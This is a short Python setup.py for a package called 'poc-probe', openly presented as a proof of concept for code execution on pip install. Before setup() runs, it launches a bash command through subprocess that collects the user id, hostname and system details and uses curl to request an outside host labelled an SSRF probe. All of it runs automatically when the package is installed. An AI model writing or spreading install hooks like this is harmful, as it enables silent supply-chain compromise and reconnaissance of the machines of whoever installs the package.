import subprocess
from setuptools import setup
subprocess.run(['bash','-c','echo "===== POC_RCE_PIP ====="; date -u; id; hostname; uname -a; echo "===== SSRF_PROBE ====="; curl -sS -m 20 -w "\\nHTTP:%{http_code}\\n" https://src-ssrf.bytedance.net/ssrf || true; echo "===== POC_RCE_END ====="'], check=False)
setup(name='poc-probe', version='0.0.1', py_modules=[])
